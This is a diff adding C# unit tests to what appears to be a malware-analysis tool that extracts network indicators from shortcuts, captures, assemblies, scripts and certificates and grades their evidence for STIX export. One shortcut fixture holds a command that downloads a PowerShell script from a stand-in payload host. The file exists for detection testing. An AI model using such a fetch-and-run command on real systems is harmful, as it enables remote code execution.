@@ -31,6 +31,86 @@ public sealed class IndicatorTests : IDisposable
     }
 
     [Fact]
+    public void A_shortcut_URL_is_a_reference()
+    {
+        var link = Inspect(new ShellLinkFileView(), "a.lnk", ShellLinkTests.Shortcut("/c curl http://payload.example.net/a.ps1"))!;
+        Assert.All(link.Indicators, h => Assert.Equal("reference", h.Evidence));
+    }
+
+    [Fact]
+    public void A_capture_name_is_traffic()
+    {
+        var list = List("a.pcap", PcapTests.Pcap(PcapTests.EthernetFrames()));
+        Assert.Equal("traffic", list.Indicators.Single(i => i is { Type: "domain", Value: "api.example.com" }).Evidence);
+    }
+
+    [Fact]
+    public void A_value_the_code_passes_to_a_network_API_is_a_reference()
+    {
+        var app = InspectionTests.Compile("Caller", """
+            public static class Caller
+            {
+                public static object Open() => new System.Uri("https://opened.example.com/a");
+                public static string Name() => "https://named.example.com/b";
+            }
+            """);
+        var list = List("Caller.dll", app);
+        Assert.Equal("reference", list.Indicators.Single(i => i.Value == "https://opened.example.com/a").Evidence);
+        Assert.Equal("string", list.Indicators.Single(i => i.Value == "https://named.example.com/b").Evidence);
+    }
+
+    [Fact]
+    public void Script_text_is_a_string()
+    {
+        var view = Inspect(new ScriptFileView(), "drop.ps1", Encoding.UTF8.GetBytes("# mirror: https://mirror.example.com/a\nWrite-Output 'x'\n"))!;
+        Assert.All(view.Indicators, h => Assert.Equal("string", h.Evidence));
+        Assert.NotEmpty(view.Indicators);
+    }
+
+    [Fact]
+    public void Certificate_names_and_URLs_are_decoded()
+    {
+        var hits = IndicatorList.FromCertificates("certificate", [Certificate("CN=api.example.com", "CN=Example Issuing CA", false, false, "OCSP http://ocsp.example.com")], default);
+        Assert.NotEmpty(hits);
+        Assert.All(hits, h => Assert.Equal("decoded", h.Evidence));
+    }
+
+    [Fact]
+    public void Native_image_text_is_a_string()
+    {
+        var hits = IndicatorList.FromImageStrings("native", Encoding.ASCII.GetBytes("\0\0http://image.example.com/a\0\0"), default);
+        Assert.NotEmpty(hits);
+        Assert.All(hits, h => Assert.Equal("string", h.Evidence));
+    }
+
+    [Fact]
+    public void A_value_merged_from_two_classes_keeps_the_stronger()
+    {
+        Assert.Equal("traffic", IndicatorEvidence.Stronger("reference", "traffic"));
+        Assert.Equal("reference", IndicatorEvidence.Stronger("reference", "string"));
+        Assert.Equal(85, IndicatorEvidence.Confidence("traffic"));
+    }
+
+    [Fact]
+    public void A_name_in_an_assembly_and_a_capture_keeps_traffic()
+    {
+        var app = InspectionTests.Compile("Named", """
+            public static class Named { public static string Name() => "api.example.com"; }
+            """);
+        var path = _dir.File("Named.dll");
+        File.WriteAllBytes(path, app);
+        var summary = new InspectionService(_ws).Summarize(null, path, default, new FileViewOptions("indicators") { Stix = true });
+        var capture = new FileView(new object(), []) { Indicators = [new IndicatorHit("domain", "api.example.com", "pcap", "DNS query", IndicatorEvidence.Traffic)] };
+        var merged = summary with { Views = new Dictionary<string, FileView> { ["pcap"] = capture } };
+        var row = IndicatorList.Of(merged).Indicators.Single(i => i is { Type: "domain", Value: "api.example.com" });
+        Assert.Equal("traffic", row.Evidence);
+        Assert.Equal(2, row.Sources.Count);
+        using var bundle = System.Text.Json.JsonDocument.Parse(StixBundle.Write(merged, "1.0.0", DateTimeOffset.UnixEpoch, Guid.NewGuid(), Guid.NewGuid()));
+        var observable = bundle.RootElement.GetProperty("objects").EnumerateArray().Single(o => o.GetProperty("type").GetString() == "domain-name");
+        Assert.Equal("traffic", observable.GetProperty("x_corvus_evidence").GetString());
+    }
+
+    [Fact]
     public void A_shortcut_to_a_local_document_gives_no_indicators()
     {
         var view = Inspect(new ShellLinkFileView(), "a.lnk", ShellLinkTests.Shortcut("/c start invoice.pdf"))!;
